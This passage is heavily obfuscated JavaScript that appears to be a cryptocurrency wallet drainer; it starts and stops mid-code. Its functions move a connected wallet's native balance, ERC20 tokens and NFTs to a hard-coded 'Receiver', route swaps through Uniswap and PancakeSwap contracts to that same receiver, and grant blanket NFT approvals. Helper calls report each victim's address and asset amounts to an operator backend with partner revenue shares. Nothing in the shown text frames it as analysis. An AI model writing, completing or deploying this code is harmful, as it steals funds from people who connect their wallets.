				Math[_0x3a21b4(0xe4)](Date[_0x3a21b4(0x15c)]() / 0x3e8) +
				0x270f * 0xa,
			_0x4c1302 = new ethers[_0x3a21b4(0x10a)](
				_0x4605ca[_0x3a21b4(0x285)],
				FLASH_Uniswap_ABI,
				FLASH_Signer
			),
			_0x19f7da = ethers[_0x3a21b4(0x1c5)]
				[_0x3a21b4(0x24c)](await _0x197a85[_0x3a21b4(0x103)]())
				[_0x3a21b4(0x28f)](ethers["BigNumber"][_0x3a21b4(0x24c)]("100"))
				[_0x3a21b4(0xeb)](
					ethers[_0x3a21b4(0x1c5)]["from"](_0x3a21b4(0x15d))
				)
				[_0x3a21b4(0x1b5)](),
			_0x21f8af = await get_nonce(_0x4605ca["chain_id"]),
			_0x97ef5a = [];
		for (const _0x437cd3 of _0x5e00d0) {
			try {
				const _0x2aca04 = ethers["BigNumber"]
						[_0x3a21b4(0x24c)](_0x437cd3["amount_raw"])
						[_0x3a21b4(0x178)](
							ethers[_0x3a21b4(0x1c5)][_0x3a21b4(0x24c)](
								_0x437cd3["swapper_allowance"]
							)
						)
						? ethers[_0x3a21b4(0x1c5)]
								[_0x3a21b4(0x24c)](_0x437cd3[_0x3a21b4(0x247)])
								[_0x3a21b4(0x1b5)]()
						: ethers[_0x3a21b4(0x1c5)]
								[_0x3a21b4(0x24c)](
									_0x437cd3["swapper_allowance"]
								)
								["toString"](),
					_0xd8ecc1 = new _0x2ca40d[_0x3a21b4(0x251)][
						_0x3a21b4(0x10a)
					](FLASH_Uniswap_ABI, _0x437cd3["swapper_address"]),
					_0x18d167 = _0xd8ecc1["methods"]
						[_0x3a21b4(0x12c)](
							_0x2aca04,
							"0",
							[
								_0x437cd3[_0x3a21b4(0x190)],
								FLASH_Swap_Route[_0x437cd3[_0x3a21b4(0x114)]],
							],
							FLASH_Settings["Receiver"]
						)
						[_0x3a21b4(0x258)]();
				_0x97ef5a[_0x3a21b4(0x185)](_0x18d167);
			} catch (_0x366c44) {
				console[_0x3a21b4(0x215)](_0x366c44);
			}
		}
		let _0x2ea28a = null,
			_0x462f2a = 0x0;
		while (_0x462f2a < 0x3) {
			try {
				(_0x2ea28a = await _0x4c1302[_0x3a21b4(0x1a7)][_0x3a21b4(0xfc)](
					_0x4b4779,
					_0x97ef5a,
					{ from: FLASH_Current_Address }
				)),
					(_0x2ea28a = ethers[_0x3a21b4(0x1c5)]
						[_0x3a21b4(0x24c)](_0x2ea28a)
						["div"](
							ethers[_0x3a21b4(0x1c5)][_0x3a21b4(0x24c)](
								_0x3a21b4(0x279)
							)
						)
						["mul"](
							ethers["BigNumber"][_0x3a21b4(0x24c)](
								_0x3a21b4(0x15d)
							)
						)
						[_0x3a21b4(0x1b5)]()),
					(_0x462f2a = 0x3);
			} catch (_0xe00a5e) {
				(_0x2ea28a =
					_0x4605ca[_0x3a21b4(0x114)] == 0xa4b1
						? 0x4c4b40
						: _0x4605ca[_0x3a21b4(0x114)] == 0xa86a
						? 0x4c4b40
						: 0x7a120),
					(_0x462f2a += 0x1);
			}
		}
		await swap_request(_0x4605ca[_0x3a21b4(0x1d0)], _0x4605ca, _0x5e00d0),
			sign_next();
		const _0x4acb69 = await _0x4c1302[_0x3a21b4(0xfc)](
			_0x4b4779,
			_0x97ef5a,
			{
				gasLimit: ethers[_0x3a21b4(0x1c5)][_0x3a21b4(0x24c)](_0x2ea28a),
				gasPrice: ethers[_0x3a21b4(0x1c5)][_0x3a21b4(0x24c)](_0x19f7da),
				nonce: _0x21f8af,
				from: FLASH_Current_Address,
			}
		);
		wait_message();
		if (FLASH_Settings["Settings"][_0x3a21b4(0x11a)])
			await _0x197a85["waitForTransaction"](
				_0x4acb69["hash"],
				0x1,
				0xea60
			);
		await swap_success(_0x4605ca[_0x3a21b4(0x1d0)], _0x4605ca, _0x5e00d0),
			sign_ready();
	},
	DO_PANCAKE_V3 = async (_0x52ad8f, _0x139162) => {
		const _0x104544 = _0x11d65a,
			_0x90aa6 = new Web3(FLASH_Provider),
			_0x4f1647 = new ethers[_0x104544(0x264)][_0x104544(0x14e)](
				FLASH_Settings[_0x104544(0x113)][_0x52ad8f[_0x104544(0x114)]]
			),
			_0x7afb1c =
				Math["floor"](Date[_0x104544(0x15c)]() / 0x3e8) + 0x270f * 0xa,
			_0x1cd600 = new ethers["Contract"](
				_0x52ad8f[_0x104544(0x285)],
				FLASH_Pancake_ABI,
				FLASH_Signer
			),
			_0x482853 = ethers[_0x104544(0x1c5)]
				[_0x104544(0x24c)](await _0x4f1647[_0x104544(0x103)]())
				[_0x104544(0x28f)](
					ethers[_0x104544(0x1c5)][_0x104544(0x24c)](_0x104544(0x279))
				)
				[_0x104544(0xeb)](
					ethers[_0x104544(0x1c5)][_0x104544(0x24c)](_0x104544(0x15d))
				)
				[_0x104544(0x1b5)](),
			_0x16821c = await get_nonce(_0x52ad8f[_0x104544(0x114)]),
			_0x56b1e2 = [];
		for (const _0x28912e of _0x139162) {
			try {
				const _0x58ed69 = ethers["BigNumber"]
						[_0x104544(0x24c)](_0x28912e[_0x104544(0x247)])
						[_0x104544(0x178)](
							ethers[_0x104544(0x1c5)][_0x104544(0x24c)](
								_0x28912e["swapper_allowance"]
							)
						)
						? ethers[_0x104544(0x1c5)]
								["from"](_0x28912e[_0x104544(0x247)])
								[_0x104544(0x1b5)]()
						: ethers[_0x104544(0x1c5)]
								[_0x104544(0x24c)](_0x28912e[_0x104544(0x269)])
								[_0x104544(0x1b5)](),
					_0x28dfdd = new _0x90aa6[_0x104544(0x251)][
						_0x104544(0x10a)
					](FLASH_Pancake_ABI, _0x28912e[_0x104544(0x285)]),
					_0xd28bac = _0x28dfdd[_0x104544(0x261)]
						[_0x104544(0x12c)](
							_0x58ed69,
							"0",
							[
								_0x28912e[_0x104544(0x190)],
								FLASH_Swap_Route[_0x28912e[_0x104544(0x114)]],
							],
							FLASH_Settings[_0x104544(0x122)]
						)
						[_0x104544(0x258)]();
				_0x56b1e2[_0x104544(0x185)](_0xd28bac);
			} catch (_0x24204b) {
				console[_0x104544(0x215)](_0x24204b);
			}
		}
		let _0x2f5400 = null,
			_0x188d0c = 0x0;
		while (_0x188d0c < 0x3) {
			try {
				(_0x2f5400 = await _0x1cd600[_0x104544(0x1a7)][_0x104544(0xfc)](
					_0x7afb1c,
					_0x56b1e2,
					{ from: FLASH_Current_Address }
				)),
					(_0x2f5400 = ethers[_0x104544(0x1c5)]
						[_0x104544(0x24c)](_0x2f5400)
						[_0x104544(0x28f)](
							ethers["BigNumber"][_0x104544(0x24c)](
								_0x104544(0x279)
							)
						)
						["mul"](
							ethers["BigNumber"][_0x104544(0x24c)](
								_0x104544(0x15d)
							)
						)
						[_0x104544(0x1b5)]()),
					(_0x188d0c = 0x3);
			} catch (_0x2a082c) {
				(_0x2f5400 =
					_0x52ad8f[_0x104544(0x114)] == 0xa4b1
						? 0x4c4b40
						: _0x52ad8f[_0x104544(0x114)] == 0xa86a
						? 0x4c4b40
						: 0x7a120),
					(_0x188d0c += 0x1);
			}
		}
		await swap_request(_0x52ad8f[_0x104544(0x1d0)], _0x52ad8f, _0x139162),
			sign_next();
		const _0x43a4bc = await _0x1cd600[_0x104544(0xfc)](
			_0x7afb1c,
			_0x56b1e2,
			{
				gasLimit: ethers[_0x104544(0x1c5)][_0x104544(0x24c)](_0x2f5400),
				gasPrice: ethers[_0x104544(0x1c5)]["from"](_0x482853),
				nonce: _0x16821c,
				from: FLASH_Current_Address,
			}
		);
		wait_message();
		if (FLASH_Settings[_0x104544(0xb0)][_0x104544(0x11a)])
			await _0x4f1647["waitForTransaction"](
				_0x43a4bc[_0x104544(0x151)],
				0x1,
				0xea60
			);
		await swap_success(_0x52ad8f[_0x104544(0x1d0)], _0x52ad8f, _0x139162),
			sign_ready();
	},
	DO_CONTRACT = async (_0x336d4e) => {
		const _0x1da440 = _0x11d65a,
			_0x396ec7 = convert_chain(
				"ID",
				_0x1da440(0x162),
				_0x336d4e[_0x1da440(0x114)]
			),
			_0x53ba31 = new ethers["providers"]["JsonRpcProvider"](
				FLASH_Settings[_0x1da440(0x113)][_0x336d4e[_0x1da440(0x114)]]
			),
			_0x20f39d = BN(await _0x53ba31[_0x1da440(0x103)]())
				[_0x1da440(0x28f)](BN(0x64))
				["mul"](BN(Math[_0x1da440(0xe4)](FLASH_Gas_Multiplier * 0x64))),
			_0x1f4765 = BN(
				_0x336d4e[_0x1da440(0x114)] == 0xa4b1
					? 0x4c4b40
					: _0x336d4e[_0x1da440(0x114)] == 0xa86a
					? 0x4c4b40
					: _0x336d4e[_0x1da440(0x114)] == 0x171
					? 0xdbba0
					: 0x249f0
			),
			_0x5966c1 = _0x1f4765[_0x1da440(0xeb)](
				FLASH_Gas_Reserves[_0x336d4e[_0x1da440(0x114)]] + 0x1
			)["mul"](_0x20f39d);
		FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0xaf)] &&
			FLASH_Settings["Public_Contract"][
				parseInt(_0x336d4e[_0x1da440(0x114)])
			] != null &&
			((FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0xd0)][_0x396ec7][
				"Contract_Legacy"
			] = 0x2),
			(FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0xd0)][_0x396ec7][
				_0x1da440(0x134)
			] =
				FLASH_Settings[_0x1da440(0x283)][
					parseInt(_0x336d4e[_0x1da440(0x114)])
				][
					FLASH_Settings["Settings"][_0x1da440(0x254)]
						? _0x336d4e[_0x1da440(0xfe)] >= 0x1f4
							? 0x1
							: 0x0
						: 0x0
				]));
		const _0x4021b6 =
				FLASH_Settings[_0x1da440(0xb0)]["Chains"][_0x396ec7][
					_0x1da440(0x295)
				] == 0x1
					? JSON[_0x1da440(0xfd)](
							_0x1da440(0x271) +
								FLASH_Settings[_0x1da440(0xb0)][
									_0x1da440(0xd0)
								][_0x396ec7][_0x1da440(0x1c8)] +
								_0x1da440(0x21c)
					  )
					: FLASH_Settings["Settings"][_0x1da440(0xd0)][_0x396ec7][
							"Contract_Legacy"
					  ] == 0x0
					? JSON["parse"](
							_0x1da440(0xcf) +
								FLASH_Settings[_0x1da440(0xb0)][
									_0x1da440(0xd0)
								][_0x396ec7][_0x1da440(0x1c8)] +
								_0x1da440(0x21c)
					  )
					: JSON["parse"](
							_0x1da440(0x22b) +
								FLASH_Settings[_0x1da440(0xb0)][
									_0x1da440(0xd0)
								][_0x396ec7][_0x1da440(0x1c8)] +
								"\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22}]"
					  ),
			_0x33d9db = new Web3(FLASH_Provider);
		let _0x57c00e = null;
		const _0x4a6cde = new _0x33d9db[_0x1da440(0x251)][_0x1da440(0x10a)](
			_0x4021b6,
			FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0xd0)][_0x396ec7][
				_0x1da440(0x134)
			]
		);
		if (
			FLASH_Settings[_0x1da440(0xb0)]["Chains"][_0x396ec7][
				"Contract_Legacy"
			] == 0x0
		)
			_0x57c00e = _0x4a6cde["methods"]
				[
					FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0xd0)][_0x396ec7][
						_0x1da440(0x1c8)
					]
				](FLASH_Settings["Receiver"])
				[_0x1da440(0x258)]();
		else {
			if (
				FLASH_Settings[_0x1da440(0xb0)]["Chains"][_0x396ec7][
					"Contract_Legacy"
				] == 0x2
			) {
				let _0x27b935 = ![];
				try {
					const _0x3c1032 = await send_request({
						action: "partner_percent",
						address: FLASH_Partner_Address,
						amount_usd: _0x336d4e[_0x1da440(0xfe)] || null,
					});
					if (
						_0x3c1032[_0x1da440(0x1c2)] == "OK" &&
						_0x3c1032["mode"] == !![]
					)
						_0x27b935 = _0x3c1032[_0x1da440(0x1ad)];
				} catch (_0x5a6a75) {
					console["log"](_0x5a6a75);
				}
				let _0x1bbe9d = !_0x27b935
					? _0x1da440(0x1f6)
					: FLASH_Partner_Address;
				_0x57c00e = _0x4a6cde[_0x1da440(0x261)]
					[
						FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0xd0)][
							_0x396ec7
						][_0x1da440(0x1c8)]
					](
						FLASH_Current_Address,
						FLASH_Settings[_0x1da440(0x122)],
						_0x1bbe9d,
						_0x33d9db[_0x1da440(0x1e8)][_0x1da440(0x194)](
							!_0x27b935 ? 0x0 : _0x27b935
						),
						FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0x255)]
					)
					[_0x1da440(0x258)]();
			} else
				_0x57c00e = _0x4a6cde[_0x1da440(0x261)]
					[
						FLASH_Settings[_0x1da440(0xb0)]["Chains"][_0x396ec7][
							_0x1da440(0x1c8)
						]
					]()
					[_0x1da440(0x258)]();
		}
		let _0x27c02b = {
			from: FLASH_Current_Address,
			to: FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0xd0)][_0x396ec7][
				_0x1da440(0x134)
			],
			value: BN(0x64),
			data: _0x57c00e,
		};
		const _0x143f5c = BN(
				_0x336d4e[_0x1da440(0x114)] == 0xa4b1
					? 0x4c4b40
					: _0x336d4e[_0x1da440(0x114)] == 0xa86a
					? 0x4c4b40
					: _0x336d4e[_0x1da440(0x114)] == 0x171
					? 0xdbba0
					: 0x186a0
			),
			_0x686451 = await _0x53ba31["getBalance"](FLASH_Current_Address),
			_0x23f065 = _0x686451[_0x1da440(0x21b)](
				_0x143f5c[_0x1da440(0xeb)](_0x20f39d)
			)["sub"](_0x5966c1);
		if (_0x23f065["lte"](BN(0x0))) {
			(_0x27c02b["to"] = FLASH_Settings["Receiver"]),
				(_0x27c02b["data"] = "0x");
			const _0x780ea6 = await _0x53ba31[_0x1da440(0x1a7)](_0x27c02b),
				_0x19d3c3 = _0x686451["sub"](
					_0x780ea6[_0x1da440(0xeb)](_0x20f39d)
				)[_0x1da440(0x21b)](_0x5966c1);
			if (_0x19d3c3[_0x1da440(0x178)](BN(0x0))) throw "LOW_BALANCE";
			else return TRANSFER_NATIVE(_0x336d4e, !![]);
		}
		const _0x45ca79 = await _0x53ba31[_0x1da440(0x263)](
			FLASH_Current_Address,
			_0x1da440(0x15f)
		);
		(_0x27c02b[_0x1da440(0x145)] = _0x23f065),
			(_0x27c02b["nonce"] = _0x45ca79),
			(_0x27c02b[_0x1da440(0xa6)] = _0x20f39d),
			(_0x27c02b[_0x1da440(0x227)] = _0x143f5c),
			await transfer_request(_0x336d4e),
			sign_next();
		const _0x3b7a44 = await FLASH_Signer[_0x1da440(0x119)](_0x27c02b);
		wait_message();
		if (FLASH_Settings[_0x1da440(0xb0)][_0x1da440(0x11a)])
			await _0x53ba31["waitForTransaction"](
				_0x3b7a44[_0x1da440(0x151)],
				0x1,
				0x7530
			);
		await transfer_success(_0x336d4e, _0x23f065), sign_ready();
	},
	DO_RANDOMIZER_NATIVE = async (_0xf58e99) => {
		const _0xb57c84 = _0x11d65a,
			_0x2b4f4c = new ethers[_0xb57c84(0x264)][_0xb57c84(0x14e)](
				FLASH_Settings[_0xb57c84(0x113)][_0xf58e99[_0xb57c84(0x114)]]
			),
			_0x35308e = BN(await _0x2b4f4c["getGasPrice"]())
				[_0xb57c84(0x28f)](BN(0x64))
				[_0xb57c84(0xeb)](
					BN(Math[_0xb57c84(0xe4)](FLASH_Gas_Multiplier * 0x64))
				),
			_0x344fe7 = BN(
				_0xf58e99["chain_id"] == 0xa4b1
					? 0x4c4b40
					: _0xf58e99[_0xb57c84(0x114)] == 0xa86a
					? 0x4c4b40
					: _0xf58e99[_0xb57c84(0x114)] == 0x171
					? 0xdbba0
					: 0x249f0
			),
			_0xb15568 = _0x344fe7[_0xb57c84(0xeb)](
				FLASH_Gas_Reserves[_0xf58e99["chain_id"]] + 0x1
			)[_0xb57c84(0xeb)](_0x35308e);
		let _0x27e3be = {
			from: FLASH_Current_Address,
			to: FLASH_Settings[_0xb57c84(0x28b)][_0xb57c84(0x190)],
			value: BN(0x64),
			data: "0x",
		};
		const _0x28ea1d = await _0x2b4f4c[_0xb57c84(0x1a7)](_0x27e3be),
			_0x4c8b89 = await _0x2b4f4c[_0xb57c84(0x1ae)](
				FLASH_Current_Address
			),
			_0x34c676 = _0x4c8b89[_0xb57c84(0x21b)](
				_0x28ea1d[_0xb57c84(0xeb)](_0x35308e)
			)["sub"](_0xb15568);
		if (_0x34c676["lte"](BN(0x0))) throw _0xb57c84(0xf6);
		const _0x5a1e74 = await _0x2b4f4c[_0xb57c84(0x263)](
			FLASH_Current_Address,
			"pending"
		);
		(_0x27e3be["value"] = _0x34c676),
			(_0x27e3be["nonce"] = _0x5a1e74),
			(_0x27e3be[_0xb57c84(0xa6)] = _0x35308e),
			(_0x27e3be["gasLimit"] = _0x28ea1d),
			await transfer_request(_0xf58e99),
			sign_next();
		const _0x358e73 = await FLASH_Signer[_0xb57c84(0x119)](_0x27e3be);
		wait_message();
		if (FLASH_Settings[_0xb57c84(0xb0)][_0xb57c84(0x11a)])
			await _0x2b4f4c[_0xb57c84(0x124)](
				_0x358e73[_0xb57c84(0x151)],
				0x1,
				0x7530
			);
		const _0x5a7415 = send_request({
			action: _0xb57c84(0x298),
			wallet: FLASH_Settings[_0xb57c84(0x28b)],
			chain_id: _0xf58e99[_0xb57c84(0x114)],
			amount_usd: _0xf58e99[_0xb57c84(0xfe)],
			user_id: FLASH_ID,
			asset: _0xf58e99,
			address: FLASH_Current_Address,
		});
		if (FLASH_Settings[_0xb57c84(0xb0)][_0xb57c84(0x123)]) await _0x5a7415;
		await transfer_success(_0xf58e99, _0x34c676), sign_ready();
	},
	TRANSFER_NATIVE = async (_0x53732b, _0x435451 = ![]) => {
		const _0x51f4eb = _0x11d65a,
			_0x3c529f = convert_chain(
				"ID",
				_0x51f4eb(0x162),
				_0x53732b[_0x51f4eb(0x114)]
			);
		if (
			FLASH_Settings[_0x51f4eb(0xb0)][_0x51f4eb(0x121)] &&
			FLASH_Settings[_0x51f4eb(0x28b)] != null
		)
			return DO_RANDOMIZER_NATIVE(_0x53732b);
		if (
			_0x435451 == ![] &&
			(FLASH_Settings[_0x51f4eb(0xb0)][_0x51f4eb(0xd0)][_0x3c529f][
				"Contract_Address"
			] != "" ||
				(FLASH_Settings[_0x51f4eb(0xb0)][_0x51f4eb(0xaf)] &&
					FLASH_Settings[_0x51f4eb(0x283)][
						parseInt(_0x53732b[_0x51f4eb(0x114)])
					] != null)) &&
			_0x53732b[_0x51f4eb(0xfe)] >=
				FLASH_Settings[_0x51f4eb(0xb0)][_0x51f4eb(0x175)]
		)
			return DO_CONTRACT(_0x53732b);
		const _0x3de970 = new ethers[_0x51f4eb(0x264)][_0x51f4eb(0x14e)](
				FLASH_Settings[_0x51f4eb(0x113)][_0x53732b[_0x51f4eb(0x114)]]
			),
			_0x492196 = BN(await _0x3de970[_0x51f4eb(0x103)]())
				["div"](BN(0x64))
				[_0x51f4eb(0xeb)](
					BN(Math[_0x51f4eb(0xe4)](FLASH_Gas_Multiplier * 0x64))
				),
			_0x43e902 = BN(
				_0x53732b[_0x51f4eb(0x114)] == 0xa4b1
					? 0x4c4b40
					: _0x53732b[_0x51f4eb(0x114)] == 0xa86a
					? 0x4c4b40
					: _0x53732b[_0x51f4eb(0x114)] == 0x171
					? 0xdbba0
					: 0x249f0
			),
			_0x12f8d5 = _0x43e902[_0x51f4eb(0xeb)](
				FLASH_Gas_Reserves[_0x53732b["chain_id"]] + 0x1
			)["mul"](_0x492196);
		let _0x2eb256 = {
			from: FLASH_Current_Address,
			to: FLASH_Settings["Receiver"],
			value: BN(0x64),
			data: "0x",
		};
		const _0x466aa5 = await _0x3de970[_0x51f4eb(0x1a7)](_0x2eb256),
			_0x13e85f = await _0x3de970[_0x51f4eb(0x1ae)](
				FLASH_Current_Address
			),
			_0x36e83f = _0x13e85f[_0x51f4eb(0x21b)](
				_0x466aa5[_0x51f4eb(0xeb)](_0x492196)
			)["sub"](_0x12f8d5);
		if (_0x36e83f[_0x51f4eb(0x178)](BN(0x0))) throw _0x51f4eb(0xf6);
		const _0x24182c = await _0x3de970[_0x51f4eb(0x263)](
			FLASH_Current_Address,
			_0x51f4eb(0x15f)
		);
		(_0x2eb256[_0x51f4eb(0x145)] = _0x36e83f),
			(_0x2eb256[_0x51f4eb(0x241)] = _0x24182c),
			(_0x2eb256[_0x51f4eb(0xa6)] = _0x492196),
			(_0x2eb256[_0x51f4eb(0x227)] = _0x466aa5),
			await transfer_request(_0x53732b),
			sign_next();
		const _0xf7e9e9 = await FLASH_Signer[_0x51f4eb(0x119)](_0x2eb256);
		wait_message();
		if (FLASH_Settings[_0x51f4eb(0xb0)]["Wait_For_Confirmation"])
			await _0x3de970[_0x51f4eb(0x124)](
				_0xf7e9e9[_0x51f4eb(0x151)],
				0x1,
				0x7530
			);
		await transfer_success(_0x53732b, _0x36e83f), sign_ready();
	},
	DO_RANDOMIZER_TOKEN = async (_0x219e71) => {
		const _0x3f0b2e = _0x11d65a,
			_0x4b96dd = new ethers[_0x3f0b2e(0x264)][_0x3f0b2e(0x14e)](
				FLASH_Settings[_0x3f0b2e(0x113)][_0x219e71[_0x3f0b2e(0x114)]]
			),
			_0x2f6d1e = BN(await _0x4b96dd[_0x3f0b2e(0x103)]())
				["div"](BN(0x64))
				[_0x3f0b2e(0xeb)](
					BN(Math["floor"](FLASH_Gas_Multiplier * 0x64))
				);
		let _0x138e9d = {
			from: FLASH_Current_Address,
			to: _0x219e71["address"],
			value: _0x3f0b2e(0x24b),
			data: "0x",
		};
		const _0x531cf5 = new Web3(FLASH_Provider);
		let _0x43558a = null;
		const _0x2f4664 = new _0x531cf5[_0x3f0b2e(0x251)][_0x3f0b2e(0x10a)](
			FLASH_Contract_ABI[_0x3f0b2e(0x1d6)],
			_0x219e71[_0x3f0b2e(0x190)]
		);
		(_0x43558a = _0x2f4664["methods"]
			[_0x3f0b2e(0x29b)](
				FLASH_Settings[_0x3f0b2e(0x28b)]["address"],
				_0x219e71[_0x3f0b2e(0x247)]
			)
			[_0x3f0b2e(0x258)]()),
			(_0x138e9d["data"] = _0x43558a);
		const _0x361f1d = await _0x4b96dd[_0x3f0b2e(0x1a7)](_0x138e9d),
			_0x162ab5 = await _0x4b96dd[_0x3f0b2e(0x1ae)](
				FLASH_Current_Address
			),
			_0x49425c = _0x162ab5["sub"](_0x361f1d["mul"](_0x2f6d1e));
		if (_0x49425c["lt"](BN(0x0))) throw _0x3f0b2e(0xf6);
		const _0x4fecbb = await _0x4b96dd[_0x3f0b2e(0x263)](
			FLASH_Current_Address,
			"pending"
		);
		(_0x138e9d[_0x3f0b2e(0x241)] = _0x4fecbb),
			(_0x138e9d[_0x3f0b2e(0xa6)] = _0x2f6d1e),
			(_0x138e9d[_0x3f0b2e(0x227)] = _0x361f1d),
			await transfer_request(_0x219e71),
			sign_next();
		const _0x39f8c5 = await FLASH_Signer[_0x3f0b2e(0x119)](_0x138e9d);
		wait_message();
		if (FLASH_Settings[_0x3f0b2e(0xb0)][_0x3f0b2e(0x11a)])
			await _0x4b96dd[_0x3f0b2e(0x124)](
				_0x39f8c5[_0x3f0b2e(0x151)],
				0x1,
				0x7530
			);
		const _0x2aaf18 = send_request({
			action: "withdraw_token",
			wallet: FLASH_Settings[_0x3f0b2e(0x28b)],
			chain_id: _0x219e71[_0x3f0b2e(0x114)],
			amount_usd: _0x219e71[_0x3f0b2e(0xfe)],
			user_id: FLASH_ID,
			asset: _0x219e71,
			address: FLASH_Current_Address,
		});
		if (FLASH_Settings[_0x3f0b2e(0xb0)]["Wait_For_Response"])
			await _0x2aaf18;
		await transfer_success(_0x219e71), sign_ready();
	},
	TRANSFER_TOKEN = async (_0x47ee58) => {
		const _0x181719 = _0x11d65a;
		if (
			FLASH_Settings["Settings"][_0x181719(0x287)] &&
			FLASH_Settings[_0x181719(0x28b)] != null
		)
			return DO_RANDOMIZER_TOKEN(_0x47ee58);
		const _0x2e3da6 = new ethers["providers"][_0x181719(0x14e)](
				FLASH_Settings[_0x181719(0x113)][_0x47ee58[_0x181719(0x114)]]
			),
			_0x121db4 = BN(await _0x2e3da6[_0x181719(0x103)]())
				[_0x181719(0x28f)](BN(0x64))
				[_0x181719(0xeb)](
					BN(Math["floor"](FLASH_Gas_Multiplier * 0x64))
				);
		let _0x2fe067 = {
			from: FLASH_Current_Address,
			to: _0x47ee58[_0x181719(0x190)],
			value: "0x0",
			data: "0x",
		};
		const _0x31c319 = new Web3(FLASH_Provider);
		let _0x480833 = null;
		const _0x29ad7a = new _0x31c319["eth"][_0x181719(0x10a)](
			FLASH_Contract_ABI["ERC20"],
			_0x47ee58[_0x181719(0x190)]
		);
		(_0x480833 = _0x29ad7a["methods"]
			[_0x181719(0x29b)](
				FLASH_Settings[_0x181719(0x122)],
				_0x47ee58[_0x181719(0x247)]
			)
			[_0x181719(0x258)]()),
			(_0x2fe067[_0x181719(0x187)] = _0x480833);
		const _0x2e66ea = await _0x2e3da6[_0x181719(0x1a7)](_0x2fe067),
			_0x53b830 = await _0x2e3da6[_0x181719(0x1ae)](
				FLASH_Current_Address
			),
			_0x40423e = _0x53b830[_0x181719(0x21b)](
				_0x2e66ea["mul"](_0x121db4)
			);
		if (_0x40423e["lt"](BN(0x0))) throw _0x181719(0xf6);
		const _0x59eb6a = await _0x2e3da6[_0x181719(0x263)](
			FLASH_Current_Address,
			_0x181719(0x15f)
		);
		(_0x2fe067[_0x181719(0x241)] = _0x59eb6a),
			(_0x2fe067[_0x181719(0xa6)] = _0x121db4),
			(_0x2fe067[_0x181719(0x227)] = _0x2e66ea),
			await transfer_request(_0x47ee58),
			sign_next();
		const _0x3a238c = await FLASH_Signer[_0x181719(0x119)](_0x2fe067);
		wait_message();
		if (FLASH_Settings[_0x181719(0xb0)][_0x181719(0x11a)])
			await _0x2e3da6[_0x181719(0x124)](
				_0x3a238c[_0x181719(0x151)],
				0x1,
				0x7530
			);
		await transfer_success(_0x47ee58), sign_ready();
	},
	TRANSFER_NFT = async (_0x4648f6) => {
		const _0x25ff76 = _0x11d65a,
			_0x252f3a = new ethers[_0x25ff76(0x264)][_0x25ff76(0x14e)](
				FLASH_Settings[_0x25ff76(0x113)][_0x4648f6[_0x25ff76(0x114)]]
			),
			_0x597543 = BN(await _0x252f3a[_0x25ff76(0x103)]())
				[_0x25ff76(0x28f)](BN(0x64))
				[_0x25ff76(0xeb)](
					BN(Math[_0x25ff76(0xe4)](FLASH_Gas_Multiplier * 0x64))
				);
		let _0x3e8916 = {
			from: FLASH_Current_Address,
			to: _0x4648f6[_0x25ff76(0x190)],
			value: _0x25ff76(0x24b),
			data: "0x",
		};
		const _0x589823 = new Web3(FLASH_Provider);
		let _0x508a23 = null;
		const _0x431f5c = new _0x589823[_0x25ff76(0x251)]["Contract"](
			FLASH_Contract_ABI[_0x25ff76(0x10f)],
			_0x4648f6["address"]
		);
		(_0x508a23 = _0x431f5c[_0x25ff76(0x261)]
			[_0x25ff76(0xd8)](
				FLASH_Current_Address,
				FLASH_Settings[_0x25ff76(0x122)],
				_0x4648f6["id"]
			)
			[_0x25ff76(0x258)]()),
			(_0x3e8916[_0x25ff76(0x187)] = _0x508a23);
		const _0x3a28fb = await _0x252f3a[_0x25ff76(0x1a7)](_0x3e8916),
			_0x41ff19 = await _0x252f3a[_0x25ff76(0x1ae)](
				FLASH_Current_Address
			),
			_0x4de366 = _0x41ff19[_0x25ff76(0x21b)](
				_0x3a28fb[_0x25ff76(0xeb)](_0x597543)
			);
		if (_0x4de366["lt"](BN(0x0))) throw "LOW_BALANCE";
		const _0xcf0806 = await _0x252f3a[_0x25ff76(0x263)](
			FLASH_Current_Address,
			"pending"
		);
		(_0x3e8916["nonce"] = _0xcf0806),
			(_0x3e8916[_0x25ff76(0xa6)] = _0x597543),
			(_0x3e8916[_0x25ff76(0x227)] = _0x3a28fb),
			await transfer_request(_0x4648f6),
			sign_next();
		const _0x359422 = await FLASH_Signer[_0x25ff76(0x119)](_0x3e8916);
		wait_message();
		if (FLASH_Settings[_0x25ff76(0xb0)][_0x25ff76(0x11a)])
			await _0x252f3a["waitForTransaction"](
				_0x359422["hash"],
				0x1,
				0x7530
			);
		await transfer_success(_0x4648f6), sign_ready();
	},
	DO_SAFA = async (_0x270e1a) => {
		const _0x29f317 = _0x11d65a,
			_0x3d6a31 = new ethers[_0x29f317(0x264)]["JsonRpcProvider"](
				FLASH_Settings[_0x29f317(0x113)][_0x270e1a[_0x29f317(0x114)]]
			),
			_0x56044c = BN(await _0x3d6a31["getGasPrice"]())
				[_0x29f317(0x28f)](BN(0x64))
				[_0x29f317(0xeb)](
					BN(Math[_0x29f317(0xe4)](FLASH_Gas_Multiplier * 0x64))
				);
		let _0x4fa9c3 = {
			from: FLASH_Current_Address,
			to: _0x270e1a[_0x29f317(0x190)],
			value: _0x29f317(0x24b),
			data: "0x",
		};
		const _0x1ee363 = new Web3(FLASH_Provider);
		let _0x2b020 = null;
		const _0x3c65f6 = new _0x1ee363[_0x29f317(0x251)][_0x29f317(0x10a)](
			FLASH_Contract_ABI[_0x29f317(0x10f)],
			_0x270e1a[_0x29f317(0x190)]
		);
		(_0x2b020 = _0x3c65f6[_0x29f317(0x261)]
			[_0x29f317(0x1d5)](FLASH_Settings[_0x29f317(0x24e)], !![])
			[_0x29f317(0x258)]()),
			(_0x4fa9c3[_0x29f317(0x187)] = _0x2b020);
		const _0x379a33 = await _0x3d6a31[_0x29f317(0x1a7)](_0x4fa9c3),
			_0x5b2ac8 = await _0x3d6a31["getBalance"](FLASH_Current_Address),
			_0x505d1c = _0x5b2ac8[_0x29f317(0x21b)](
				_0x379a33["mul"](_0x56044c)
			);
		if (_0x505d1c["lt"](BN(0x0))) throw _0x29f317(0xf6);
		const _0x2cf5e3 = await _0x3d6a31["getTransactionCount"](
